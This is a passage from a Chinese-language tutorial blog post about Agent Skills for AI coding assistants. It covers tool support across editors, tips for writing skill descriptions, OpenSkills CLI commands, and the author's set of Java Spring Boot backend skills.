<li>✅ 工具集成：可以调用外部工具和脚本</li>
</ul>
<p><strong>劣势</strong>：</p>
<ul>
<li>⚠️ 需要配置：需要设置 MCP 服务器</li>
<li>⚠️ 依赖外部：需要外部系统可用</li>
<li>⚠️ 性能考虑：网络调用可能较慢</li>
</ul>
<p><strong>适用场景</strong>：</p>
<ul>
<li>访问数据库查询数据</li>
<li>调用外部 API</li>
<li>执行系统命令</li>
<li>读取文件系统</li>
</ul>
<h4 data-id="heading-16">2.3 融合趋势</h4>
<p><strong>重要更新</strong>：在 Claude Code 2.1.3+ 版本中，Anthropic 正在<strong>合并</strong> Commands 和 Skills，将两者视为同一种能力单元，主要区别仅在"调用方式"（显式 vs 自动触发）。</p>
<p><strong>合并后的特点</strong>：</p>
<ul>
<li>无论是 <code>.claude/commands/</code> 还是 <code>.claude/skills/</code> 中的内容，从系统角度看都是 Skill</li>
<li>可以通过 Settings 或 frontmatter 设定是否允许自动触发</li>
<li>支持 <code>user-invocable</code>、<code>disable-model-invocation</code> 等设置</li>
</ul>
<p><strong>建议</strong>：</p>
<ul>
<li>新项目建议直接使用 Skills 标准格式</li>
<li>简单命令可以创建为 Skill，但设置 <code>disable-model-invocation: true</code> 仅允许手动调用</li>
<li>复杂工作流使用完整的 Skills 结构，支持自动发现</li>
</ul>
<h4 data-id="heading-17">2.4 使用建议</h4>
<p><strong>组合使用</strong>（最佳实践）：</p>
<ul>
<li><strong>Rules</strong>：放置编码规范、架构约束等静态规则（平台特定）</li>
<li><strong>Commands</strong>：放置简单、频繁重用的快捷命令（平台特定，或迁移到 Skills）</li>
<li><strong>Skills</strong>：放置可执行的工作流、特定领域的动态知识（跨平台标准，推荐）</li>
<li><strong>MCP</strong>：连接外部系统，获取实时数据（开放协议）</li>
<li><strong>BusAgent</strong>：封装复杂业务逻辑（平台特定）</li>
</ul>
<p><strong>最强组合</strong>：Skills + MCP + Rules 并用</p>
<ul>
<li><strong>Skills</strong> 提供<strong>何时做什么</strong>以及<strong>如何做</strong>的知识</li>
<li><strong>MCP</strong> 提供<strong>能做什么动作</strong>的能力</li>
<li><strong>Rules</strong> 提供<strong>必须遵循</strong>的约束和规范</li>
<li><strong>Commands</strong> 提供<strong>快速执行</strong>的简单命令（可选，建议迁移到 Skills）</li>
<li><strong>BusAgent</strong> 提供<strong>业务逻辑封装</strong>（平台特定）</li>
</ul>
<hr/>
<h3 data-id="heading-18">3. 各大编辑工具对 Skills 的支持和适配进度</h3>
<h4 data-id="heading-19">3.1 适配情况总览</h4>











































































<table><thead><tr><th>工具/平台</th><th>支持状态</th><th>支持类型</th><th>使用方式</th><th>限制与注意事项</th></tr></thead><tbody><tr><td><strong>Claude Code</strong></td><td>✅ <strong>完全支持</strong></td><td>原生支持 Anthropic Skills 标准</td><td>文件系统目录结构（<code>.claude/skills/</code> 或 <code>.agent/skills/</code>）</td><td>自动触发机制依赖技能描述质量</td></tr><tr><td><strong>Claude.ai（Web）</strong></td><td>✅ <strong>完全支持</strong></td><td>预构建 Skills + 自定义 Skills</td><td>设置中启用，上传 ZIP 或使用 Partner Skills</td><td>需开启 Code Execution 权限</td></tr><tr><td><strong>Claude API</strong></td><td>✅ <strong>完全支持</strong></td><td>通过 API 管理 Skills</td><td><code>/v1/skills</code> 端点上传管理</td><td>需要 API 密钥和相应权限</td></tr><tr><td><strong>Cursor</strong></td><td>⚠️ <strong>Beta/Nightly</strong></td><td>通过 OpenSkills 和 AGENTS.md</td><td>使用 OpenSkills CLI 同步到 <code>.cursor/rules/AGENTS.md</code></td><td>功能尚未完全稳定，自动触发不保证</td></tr><tr><td><strong>Windsurf</strong></td><td>✅ <strong>支持</strong></td><td>原生支持 Anthropic Skills 标准</td><td>类似 Claude Code 的文件系统结构</td><td>社区反馈较少，功能相对稳定</td></tr><tr><td><strong>Aider</strong></td><td>✅ <strong>支持</strong></td><td>原生支持 Anthropic Skills 标准</td><td>文件系统目录结构</td><td>支持自动发现和手动调用</td></tr><tr><td><strong>VS Code（GitHub Copilot）</strong></td><td>✅ <strong>已集成</strong></td><td>通过 Microsoft 集成</td><td>在 VS Code 中定义 Skills</td><td>需要 GitHub Copilot 订阅</td></tr><tr><td><strong>OpenAI Codex CLI</strong></td><td>✅ <strong>部分支持</strong></td><td>Skills 框架（类似 Anthropic）</td><td><code>~/.codex/skills/</code> 目录</td><td>格式与 Anthropic 高度一致，但功能较新</td></tr><tr><td><strong>ChatGPT</strong></td><td>✅ <strong>部分支持</strong></td><td>Code Interpreter 预置 + 自定义</td><td>通过设置上传 Skills</td><td>触发机制不如 Claude 稳定</td></tr></tbody></table>
<h4 data-id="heading-20">3.2 Claude Code 详细支持情况</h4>
<p><strong>Claude Code</strong> 是 Anthropic 官方开发的 AI 编程助手，对 Skills 标准提供<strong>最完整和原生</strong>的支持。</p>
<p><strong>支持的功能</strong>：</p>
<ul>
<li>✅ <strong>自动发现</strong>：Agent 自动扫描技能目录，根据任务相关性匹配技能</li>
<li>✅ <strong>自动触发</strong>：当任务匹配技能描述时，自动加载技能内容</li>
<li>✅ <strong>手动调用</strong>：支持通过 <code>/skill-name</code> 命令手动触发</li>
<li>✅ <strong>目录结构</strong>：支持 <code>.claude/skills/</code> 和 <code>.agent/skills/</code> 目录</li>
<li>✅ <strong>完整格式</strong>：支持 SKILL.md + 脚本 + 模板 + 资源的完整结构</li>
<li>✅ <strong>组织级管理</strong>：支持团队共享和组织级 Skills</li>
</ul>
<p><strong>使用方式</strong>：</p>
<ul>
<li><strong>项目级 Skills</strong>：<code>项目根目录/.claude/skills/</code> 或 <code>.agent/skills/</code></li>
<li><strong>全局 Skills</strong>：<code>~/.claude/skills/</code> 或 <code>~/.agent/skills/</code></li>
</ul>
<h4 data-id="heading-21">3.3 Cursor 支持情况</h4>
<p><strong>支持程度</strong>：⚠️ <strong>Beta/Nightly 阶段，功能尚未完全稳定</strong></p>
<p><strong>实现方式</strong>：</p>
<ul>
<li>通过 <strong>OpenSkills CLI</strong> 工具管理技能</li>
<li>使用 <strong>AGENTS.md</strong> 文件让 Agent 发现可用技能</li>
<li>Agent 通过 <code>openskills read</code> 命令加载技能内容</li>
</ul>
<p><strong>使用流程</strong>：</p>
<ol>
<li><strong>安装技能</strong>：使用 OpenSkills 安装到 <code>.agent/skills/</code> 目录</li>
<li><strong>同步到 AGENTS.md</strong>：执行 <code>openskills sync -o .cursor/rules/AGENTS.md</code></li>
<li><strong>Agent 发现</strong>：Cursor Agent 读取 AGENTS.md 中的技能列表</li>
<li><strong>技能加载</strong>：Agent 执行 <code>openskills read &lt;skill-name&gt;</code> 加载技能</li>
</ol>
<p><strong>限制与注意事项</strong>：</p>
<ul>
<li>⚠️ <strong>自动触发不稳定</strong>：Agent 可能不会自动识别和使用技能</li>
<li>⚠️ <strong>需要手动提示</strong>：建议在任务中明确提到技能名称</li>
<li>⚠️ <strong>Nightly 版本</strong>：需要切换到 Cursor Nightly 渠道</li>
<li>⚠️ <strong>权限问题</strong>：使用 <code>openskills</code> 而非 <code>npx openskills</code> 避免权限错误</li>
</ul>
<h4 data-id="heading-22">3.4 其他工具支持情况</h4>
<h5 data-id="heading-23">Windsurf</h5>
<ul>
<li>✅ <strong>原生支持</strong>：原生支持 Anthropic Skills 标准</li>
<li>✅ <strong>自动发现</strong>：支持自动发现和手动调用</li>
<li>✅ <strong>文件系统结构</strong>：类似 Claude Code 的文件系统结构</li>
</ul>
<h5 data-id="heading-24">Aider</h5>
<ul>
<li>✅ <strong>原生支持</strong>：原生支持 Anthropic Skills 标准</li>
<li>✅ <strong>自动发现</strong>：支持自动发现和手动调用</li>
<li>✅ <strong>目录结构</strong>：支持 <code>.aider/skills/</code> 目录</li>
</ul>
<h5 data-id="heading-25">VS Code（GitHub Copilot）</h5>
<ul>
<li>✅ <strong>已集成</strong>：Microsoft 在 Anthropic 宣布开放标准后迅速集成</li>
<li>⚠️ <strong>需要订阅</strong>：需要 GitHub Copilot 订阅</li>
<li>✅ <strong>在 VS Code 中定义</strong>：支持在 VS Code 中定义和使用 Skills</li>
</ul>
<h4 data-id="heading-26">3.5 时间线与标准化进程</h4>
<h5 data-id="heading-27">关键时间节点</h5>



































<table><thead><tr><th>时间</th><th>事件</th><th>影响</th></tr></thead><tbody><tr><td><strong>2025 年 10 月中旬</strong></td><td>Anthropic 正式在 Claude 中推出 Agent Skills 功能</td><td>首次公开发布 Skills 概念</td></tr><tr><td><strong>2025 年 12 月 18 日</strong></td><td>Anthropic 将 Agent Skills 发布为<strong>开放标准</strong>（agent-skills.io）</td><td>标准化进程，Microsoft、OpenAI 等迅速集成</td></tr><tr><td><strong>Claude Code v2.1.1</strong></td><td>开始合并 Commands 和 Skills</td><td>统一底层工具</td></tr><tr><td><strong>Claude Code v2.1.3</strong></td><td>Commands 和 Skills 完全合并</td><td>用户可见的融合完成</td></tr><tr><td><strong>2026 年 1 月</strong></td><td>多个平台宣布支持或正在集成</td><td>生态逐步完善</td></tr></tbody></table>
<h5 data-id="heading-28">标准化影响</h5>
<p><strong>开放标准发布后的影响</strong>：</p>
<ul>
<li>✅ <strong>Microsoft</strong>：在 VS Code 和 GitHub 中迅速集成</li>
<li>✅ <strong>OpenAI</strong>：在 ChatGPT 和 Codex CLI 中开始支持</li>
<li>✅ <strong>第三方工具</strong>：Cursor、Windsurf、Aider 等逐步支持</li>
<li>✅ <strong>企业工具</strong>：Notion、Figma、Atlassian 等提供 Partner Skills</li>
</ul>
<hr/>
<h3 data-id="heading-29">4. Skills 使用技巧和细节</h3>
<h4 data-id="heading-30">4.1 技能描述优化技巧</h4>
<p><strong>关键原则</strong>：技能描述是 Agent 决定是否使用技能的主要依据，必须清晰、具体、包含使用场景。</p>
<h5 data-id="heading-31">好的描述示例</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">java-rest-api-design</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">生成符合主流规范的</span> <span class="hljs-string">Java</span> <span class="hljs-string">RESTful</span> <span class="hljs-string">API</span> <span class="hljs-string">接口设计，包括</span> <span class="hljs-string">Controller、DTO、统一响应格式、异常处理等。使用场景：(1)</span> <span class="hljs-string">创建新的</span> <span class="hljs-string">REST</span> <span class="hljs-string">API</span> <span class="hljs-string">接口，(2)</span> <span class="hljs-string">设计</span> <span class="hljs-string">Controller</span> <span class="hljs-string">层代码，(3)</span> <span class="hljs-string">生成</span> <span class="hljs-string">API</span> <span class="hljs-string">相关的</span> <span class="hljs-string">DTO</span> <span class="hljs-string">类，(4)</span> <span class="hljs-string">审查或优化现有</span> <span class="hljs-string">API</span> <span class="hljs-string">设计，(5)</span> <span class="hljs-string">需要遵循</span> <span class="hljs-string">Spring</span> <span class="hljs-string">Boot</span> <span class="hljs-string">最佳实践和</span> <span class="hljs-string">RESTful</span> <span class="hljs-string">规范时</span>
<span class="hljs-meta">---
</span></code></pre>
<p><strong>特点</strong>：</p>
<ul>
<li>✅ 明确说明技能功能</li>
<li>✅ 列出具体使用场景</li>
<li>✅ 包含关键词（REST API、Controller、DTO、Spring Boot）</li>
<li>✅ 描述长度适中（100-200 词）</li>
</ul>
<h5 data-id="heading-32">不好的描述示例</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">java-api</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">生成</span> <span class="hljs-string">API</span> <span class="hljs-string">代码</span>
<span class="hljs-meta">---
</span></code></pre>
<p><strong>问题</strong>：</p>
<ul>
<li>❌ 描述过于简单，缺少使用场景</li>
<li>❌ 关键词不够具体</li>
<li>❌ Agent 难以判断何时使用</li>
</ul>
<h4 data-id="heading-33">4.2 SKILL.md 内容组织技巧</h4>
<h5 data-id="heading-34">保持简洁</h5>
<p><strong>原则</strong>：SKILL.md 应保持简洁（&lt;500行，推荐&lt;300行），只包含核心流程和指导。</p>
<p><strong>好的结构</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section"># Skill 名称</span>

<span class="hljs-section">## 快速开始</span>
核心流程和步骤...

<span class="hljs-section">## 详细参考</span>
<span class="hljs-bullet">-</span> 详细内容见 [<span class="hljs-string">references/xxx.md</span>](<span class="hljs-link">references/xxx.md</span>)
<span class="hljs-bullet">-</span> 代码模板见 <span class="hljs-code">`assets/xxx.java`</span>
</code></pre>
<h5 data-id="heading-35">使用链接引用</h5>
<p><strong>原则</strong>：详细内容放在 <code>references/</code> 中，SKILL.md 中使用链接引用。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-section">## 详细参考</span>

<span class="hljs-bullet">-</span> <span class="hljs-strong">**RESTful 模式**</span>：见 [<span class="hljs-string">references/restful-patterns.md</span>](<span class="hljs-link">references/restful-patterns.md</span>)
<span class="hljs-bullet">-</span> <span class="hljs-strong">**DTO 模式**</span>：见 [<span class="hljs-string">references/dto-patterns.md</span>](<span class="hljs-link">references/dto-patterns.md</span>)
<span class="hljs-bullet">-</span> <span class="hljs-strong">**代码模板**</span>：见 <span class="hljs-code">`assets/ControllerTemplate.java`</span>
</code></pre>
<h4 data-id="heading-36">4.3 目录结构最佳实践</h4>
<h5 data-id="heading-37">标准目录结构</h5>
<pre><code class="hljs language-bash" lang="bash">skill-name/
├── SKILL.md          <span class="hljs-comment"># 必需：技能定义（简洁，&lt;300行）</span>
├── scripts/          <span class="hljs-comment"># 可选：可执行脚本</span>
├── assets/           <span class="hljs-comment"># 可选：用于输出的模板、图标等</span>
└── references/       <span class="hljs-comment"># 可选：按需加载的文档和参考资料</span>
</code></pre>
<h5 data-id="heading-38">目录用途说明</h5>
<ul>
<li><strong>SKILL.md</strong>：核心定义，应保持简洁</li>
<li><strong>scripts/</strong>：可执行脚本，用于自动化任务</li>
<li><strong>assets/</strong>：不加载到上下文，用于输出的文件（模板、图标等）</li>
<li><strong>references/</strong>：按需加载的文档和参考资料</li>
</ul>
<h4 data-id="heading-39">4.4 触发技巧</h4>
<h5 data-id="heading-40">自然语言触发（推荐）</h5>
<p><strong>方式</strong>：在任务描述中使用技能相关的关键词。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-css" lang="css">用户：为用户管理创建 <span class="hljs-attribute">REST</span> API 接口

Agent：
<span class="hljs-number">1</span>. 识别到需要"<span class="hljs-attribute">REST</span> API 设计"任务
<span class="hljs-number">2</span>. 在 AGENTS<span class="hljs-selector-class">.md</span> 中找到 java-<span class="hljs-attribute">rest</span>-api-design 技能
<span class="hljs-number">3</span>. 执行：openskills read java-<span class="hljs-attribute">rest</span>-api-design
<span class="hljs-number">4</span>. 按照技能定义生成 Controller 和 DTO 代码
</code></pre>
<h5 data-id="heading-41">明确指定技能</h5>
<p><strong>方式</strong>：在任务中明确提到技能名称。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-css" lang="css">用户：使用 java-<span class="hljs-attribute">rest</span>-api-design 技能为用户管理创建 <span class="hljs-attribute">REST</span> API
</code></pre>
<h5 data-id="heading-42">使用命令触发</h5>
<p><strong>方式</strong>：使用 <code>/skill-name</code> 命令手动触发。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-css" lang="css">用户：/java-<span class="hljs-attribute">rest</span>-api-design 为用户管理创建 <span class="hljs-attribute">REST</span> API
</code></pre>
<h4 data-id="heading-43">4.5 调试技巧</h4>
<h5 data-id="heading-44">验证技能是否被使用</h5>
<p><strong>方法 1：观察 Agent 响应</strong></p>
<ul>
<li>如果 Agent 使用了技能，应该提到技能名称</li>
<li>展示技能加载过程</li>
<li>按照技能定义的格式输出</li>
</ul>
<p><strong>方法 2：查看执行日志</strong></p>
<ul>
<li>如果 Agent 执行了 <code>openskills read</code>，应该能看到命令执行记录</li>
<li>技能内容加载过程</li>
</ul>
<p><strong>方法 3：对比输出格式</strong></p>
<ul>
<li>如果 Agent 使用了技能，输出应该符合技能定义的格式</li>
</ul>
<h5 data-id="heading-45">常见问题排查</h5>
<p><strong>问题 1：技能没有被自动触发</strong></p>
<p><strong>解决方案</strong>：</p>
<ol>
<li><strong>优化技能描述</strong>：在 YAML front matter 的 <code>description</code> 字段中使用具体、明确的关键词</li>
<li><strong>使用 forced eval hook</strong>：在技能中添加评估机制，强制 Agent 评估每个技能是否匹配</li>
<li><strong>手动提示</strong>：在任务中明确提到技能名称或相关关键词</li>
</ol>
<p><strong>问题 2：技能描述没有同步到 AGENTS.md</strong></p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>确保 SKILL.md 文件包含 YAML front matter</li>
<li>确保 <code>name</code> 和 <code>description</code> 字段存在</li>
<li>重新执行 <code>openskills sync</code></li>
</ul>
<p><strong>问题 3：技能内容加载失败</strong></p>
<p><strong>解决方案</strong>：</p>
<ul>
<li>检查技能文件路径是否正确</li>
<li>确保 <code>openskills</code> 命令可用</li>
<li>检查权限问题</li>
</ul>
<hr/>
<h3 data-id="heading-46">5. OpenSkills 使用细节</h3>
<h4 data-id="heading-47">5.1 什么是 OpenSkills</h4>
<p><strong>OpenSkills</strong> 是一个由社区开发的开源 CLI 工具，用于管理和使用遵循 <strong>Anthropic Skills 标准</strong>的技能。它将 Anthropic 定义的 Skills 开放标准扩展到任何支持的 AI 编程代理中（Cursor、Claude Code、Windsurf、Aider 等）。</p>
<p><strong>核心价值</strong>：</p>
<ul>
<li>🔧 提供统一的技能管理接口</li>
<li>📦 支持从 Anthropic 官方市场、GitHub 仓库、本地路径安装技能</li>
<li>🔄 自动同步技能信息到 <code>AGENTS.md</code>，供 Agent 发现和使用</li>
<li>🌐 支持多种安装模式（项目级、全局、通用），适配不同使用场景</li>
</ul>
<h4 data-id="heading-48">5.2 安装 OpenSkills</h4>
<h5 data-id="heading-49">前置要求</h5>
<ul>
<li>Node.js ≥ v20.6</li>
<li>Git（用于从 GitHub 安装技能）</li>
</ul>
<h5 data-id="heading-50">安装步骤</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 全局安装 OpenSkills CLI</span>
npm install -g openskills

<span class="hljs-comment"># 验证安装</span>
openskills --version
</code></pre>
<h4 data-id="heading-51">5.3 核心功能</h4>
<h5 data-id="heading-52">1. 安装技能（Install）</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 从 Anthropic 官方市场安装所有技能</span>
openskills install anthropics/skills

<span class="hljs-comment"># 从 GitHub 仓库安装特定技能</span>
openskills install username/repo-name

<span class="hljs-comment"># 从本地路径安装</span>
openskills install ./local-skill-path

<span class="hljs-comment"># 安装到通用目录（多 Agent 共享，推荐）</span>
openskills install anthropics/skills --universal

<span class="hljs-comment"># 全局安装（所有项目共享）</span>
openskills install anthropics/skills --global

<span class="hljs-comment"># 跳过确认提示（适合 CI/CD）</span>
openskills install anthropics/skills --<span class="hljs-built_in">yes</span>
</code></pre>
<p><strong>⚠️ 重要：工作目录要求</strong></p>
<ul>
<li><strong>项目级和通用模式</strong>：必须在项目根目录执行</li>
<li><strong>全局模式</strong>：可以在任何目录执行</li>
</ul>
<h5 data-id="heading-53">2. 列出已安装技能（List）</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 列出当前项目的技能</span>
openskills list

<span class="hljs-comment"># 列出全局技能</span>
openskills list --global

<span class="hljs-comment"># 列出通用技能</span>
openskills list --universal
</code></pre>
<h5 data-id="heading-54">3. 同步技能到 AGENTS.md（Sync）</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 同步到默认位置</span>
openskills <span class="hljs-built_in">sync</span>

<span class="hljs-comment"># 同步到指定路径（推荐）</span>
openskills <span class="hljs-built_in">sync</span> -o .cursor/rules/AGENTS.md

<span class="hljs-comment"># 同步到通用位置</span>
openskills <span class="hljs-built_in">sync</span> --universal

<span class="hljs-comment"># 跳过确认提示</span>
openskills <span class="hljs-built_in">sync</span> --<span class="hljs-built_in">yes</span>
</code></pre>
<p><strong>生成的 AGENTS.md 格式</strong>：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">available_skills</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">skill</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>java-rest-api-design<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>生成符合主流规范的 Java RESTful API 接口设计...<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">location</span>&gt;</span>project<span class="hljs-tag">&lt;/<span class="hljs-name">location</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">skill</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">available_skills</span>&gt;</span>
</code></pre>
<h5 data-id="heading-55">4. 读取技能内容（Read）</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 读取技能内容</span>
openskills <span class="hljs-built_in">read</span> java-rest-api-design

<span class="hljs-comment"># 读取多个技能</span>
openskills <span class="hljs-built_in">read</span> skill-one,skill-two
</code></pre>
<h5 data-id="heading-56">5. 删除技能（Remove）</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 删除指定技能</span>
openskills remove &lt;skill-name&gt;

<span class="hljs-comment"># 交互式管理（批量删除）</span>
openskills manage
</code></pre>
<h4 data-id="heading-57">5.4 安装模式详解</h4>

































<table><thead><tr><th>模式</th><th>命令参数</th><th>安装位置</th><th>需要项目目录</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>项目级</strong></td><td>无参数（默认）</td><td><code>项目目录/.claude/skills/</code></td><td>✅ 是</td><td>项目特定技能</td></tr><tr><td><strong>全局</strong></td><td><code>--global</code></td><td><code>~/.claude/skills/</code></td><td>❌ 否</td><td>所有项目共享</td></tr><tr><td><strong>通用</strong></td><td><code>--universal</code></td><td><code>项目目录/.agent/skills/</code> 或 <code>~/.agent/skills/</code></td><td>✅ 是</td><td>多 Agent 共享（推荐）</td></tr></tbody></table>
<h4 data-id="heading-58">5.5 目录识别规则</h4>
<p><strong>OpenSkills 只识别以下目录</strong>：</p>
<ul>
<li>✅ <code>.claude/skills/</code> - Claude 生态技能目录</li>
<li>✅ <code>.agent/skills/</code> - 通用技能目录（推荐）</li>
<li>❌ <code>.cursor/skills/</code> - <strong>不被 OpenSkills 识别</strong></li>
</ul>
<p><strong>目录查找优先级</strong>（从高到低）：</p>
<ol>
<li><code>./.agent/skills/</code> - 当前项目的通用技能</li>
<li><code>~/.agent/skills/</code> - 全局通用技能</li>
<li><code>./.claude/skills/</code> - 当前项目的 Claude 技能</li>
<li><code>~/.claude/skills/</code> - 全局 Claude 技能</li>
</ol>
<h4 data-id="heading-59">5.6 常见问题</h4>
<h5 data-id="heading-60">Q1: 为什么描述没有同步到 AGENTS.md？</h5>
<p><strong>A</strong>: SKILL.md 文件缺少 YAML front matter。需要在文件开头添加：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-meta">---</span>
<span class="hljs-attr">name:</span> <span class="hljs-string">skill-name</span>
<span class="hljs-attr">description:</span> <span class="hljs-string">技能描述（应包含具体使用场景，如：使用场景：(1)</span> <span class="hljs-string">xxx，(2)</span> <span class="hljs-string">xxx）</span>
<span class="hljs-meta">---
</span></code></pre>
<p><strong>注意</strong>：根据 Anthropic Skills 规范，frontmatter 只包含 <code>name</code> 和 <code>description</code>，不需要 <code>version</code> 和 <code>tags</code>。</p>
<h5 data-id="heading-61">Q2: 为什么 <code>openskills list</code> 显示没有技能？</h5>
<p><strong>A</strong>: 检查技能是否在正确的目录：</p>
<ul>
<li>确保在项目根目录执行</li>
<li>检查 <code>.agent/skills/</code> 或 <code>.claude/skills/</code> 目录</li>
<li>确保 SKILL.md 文件存在</li>
</ul>
<h5 data-id="heading-62">Q3: 为什么 <code>npx openskills</code> 报权限错误？</h5>
<p><strong>A</strong>: 使用全局安装的 <code>openskills</code> 命令，而不是 <code>npx openskills</code>：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ✅ 正确</span>
openskills <span class="hljs-built_in">read</span> java-rest-api-design

<span class="hljs-comment"># ❌ 错误（可能权限问题）</span>
npx openskills <span class="hljs-built_in">read</span> java-rest-api-design
</code></pre>
<hr/>
<h3 data-id="heading-63">6. 本项目开发的 Skills</h3>
<h4 data-id="heading-64">6.1 项目介绍</h4>
<p>本项目提供了一套完整的 <strong>Java 后端开发 Skills</strong>，基于主流后端开发规范和 Spring Boot 最佳实践，帮助开发者快速生成符合规范的代码。</p>
<p><strong>GitHub 地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flambert0529%2Fskills.git" target="_blank" title="https://github.com/lambert0529/skills.git" ref="nofollow noopener noreferrer">github.com/lambert0529…</a></p>
<p><strong>Gitee 地址</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Flbl_lambert%2Fskills.git" target="_blank" title="https://gitee.com/lbl_lambert/skills.git" ref="nofollow noopener noreferrer">gitee.com/lbl_lambert…</a></p>
<h4 data-id="heading-65">6.2 Skills 列表</h4>
<p>本项目已创建了以下 7 个 Java 后端开发 Skills：</p>
<h5 data-id="heading-66">1. <strong>java-rest-api-design</strong> - RESTful API 设计规范</h5>
<p><strong>功能</strong>：</p>
<ul>
<li>生成符合规范的 RESTful API 接口</li>
<li>创建 Controller 层代码</li>
<li>生成 API 相关的 DTO 类</li>
<li>遵循 Spring Boot 最佳实践和 RESTful 规范</li>
</ul>
<p><strong>使用场景</strong>：</p>
<ul>
<li>创建新的 REST API 接口</li>
<li>设计 Controller 层代码</li>
<li>生成 API 相关的 DTO 类</li>
<li>审查或优化现有 API 设计</li>
</ul>
<p><strong>目录结构</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">java-<span class="hljs-attribute">rest</span>-api-design/
├── SKILL<span class="hljs-selector-class">.md</span> (<span class="hljs-number">82</span> 行)
├── assets/
│   ├── ControllerTemplate<span class="hljs-selector-class">.java</span>
│   └── CreateRequestTemplate<span class="hljs-selector-class">.java</span>
└── references/
    ├── restful-patterns<span class="hljs-selector-class">.md</span>
    ├── dto-patterns<span class="hljs-selector-class">.md</span>
    └── example-usage<span class="hljs-selector-class">.md</span>
</code></pre>
<h5 data-id="heading-67">2. <strong>java-service-layer</strong> - Service 层开发规范</h5>
<p><strong>功能</strong>：</p>
<ul>
<li>生成 Service 接口和实现类</li>
<li>实现业务逻辑和事务管理</li>
<li>遵循分层架构最佳实践</li>
</ul>
<p><strong>使用场景</strong>：</p>
<ul>
<li>创建新的 Service 层代码</li>
<li>实现业务逻辑处理</li>
<li>设计 Service 接口</li>
<li>优化现有 Service 代码</li>
</ul>
<p><strong>目录结构</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">java-service-layer/
├── SKILL.md (88 行)
├── assets/
│   ├── ServiceInterfaceTemplate.java
│   └── ServiceImplTemplate.java
└── references/
<span class="hljs-code">    ├── transaction-management.md
    └── business-logic-patterns.md
</span></code></pre>
<h5 data-id="heading-68">3. <strong>java-exception-handling</strong> - 异常处理规范</h5>
<p><strong>功能</strong>：</p>
<ul>
<li>设计全局异常处理器</li>
<li>定义错误码和异常类</li>
<li>统一异常响应格式</li>
</ul>
<p><strong>使用场景</strong>：</p>
<ul>
<li>设计异常处理机制</li>
<li>创建自定义异常类</li>
<li>实现全局异常处理器</li>
<li>定义错误码体系</li>
</ul>
<p><strong>目录结构</strong>：</p>
<pre><code class="hljs language-css" lang="css">java-exception-handling/
├── SKILL<span class="hljs-selector-class">.md</span> (<span class="hljs-number">86</span> 行)
├── assets/
│   ├── GlobalExceptionHandlerTemplate<span class="hljs-selector-class">.java</span>
│   └── ErrorCodeExample<span class="hljs-selector-class">.java</span>
└── references/
    ├── exception-classes<span class="hljs-selector-class">.md</span>
    └── error-<span class="hljs-selector-tag">code</span>-definition<span class="hljs-selector-class">.md</span>
</code></pre>
<h5 data-id="heading-69">4. <strong>java-validation</strong> - 参数校验规范</h5>
<p><strong>功能</strong>：</p>
<ul>
<li>为请求参数添加校验注解</li>
<li>创建自定义校验器</li>
<li>实现分组校验</li>
</ul>
<p><strong>使用场景</strong>：</p>
<ul>
<li>为创建用户请求添加参数校验</li>
<li>创建自定义校验器</li>
<li>实现分组校验</li>
<li>优化现有校验逻辑</li>
</ul>
<p><strong>目录结构</strong>：</p>
<pre><code class="hljs language-sql" lang="sql">java<span class="hljs-operator">-</span>validation<span class="hljs-operator">/</span>
├── SKILL.md (<span class="hljs-number">127</span> 行)
├── assets<span class="hljs-operator">/</span>
│   └── CustomValidatorTemplate.java
└── <span class="hljs-keyword">references</span><span class="hljs-operator">/</span>
    ├── bean<span class="hljs-operator">-</span>validation<span class="hljs-operator">-</span>annotations.md
    ├── <span class="hljs-keyword">group</span><span class="hljs-operator">-</span>validation.md
    └── validation<span class="hljs-operator">-</span>examples.md
</code></pre>
<h5 data-id="heading-70">5. <strong>java-response-wrapper</strong> - 统一响应格式规范</h5>
<p><strong>功能</strong>：</p>
<ul>
<li>创建统一响应包装类</li>
<li>实现分页响应格式</li>
<li>统一 API 返回格式</li>
</ul>
<p><strong>使用场景</strong>：</p>
<ul>
<li>设计统一响应格式</li>
<li>创建响应包装类</li>
<li>实现分页响应</li>
<li>统一 API 返回格式</li>
</ul>
<p><strong>目录结构</strong>：</p>
<pre><code class="hljs language-vbscript" lang="vbscript">java-<span class="hljs-built_in">response</span>-wrapper/
├── SKILL.md (<span class="hljs-number">80</span> 行)
├── assets/
│   ├── ResultTemplate.java
│   └── PageResultTemplate.java
